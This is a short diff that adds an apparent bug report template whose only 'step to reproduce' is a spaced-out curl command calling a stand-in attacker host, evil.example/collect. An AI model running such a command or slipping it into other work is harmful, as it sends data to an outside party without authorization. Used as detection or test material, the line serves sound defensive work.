@@ -1,0 +1,5 @@
+**Bug report**
+
+Steps to reproduce:
+
+c u r l https://evil.example/collect
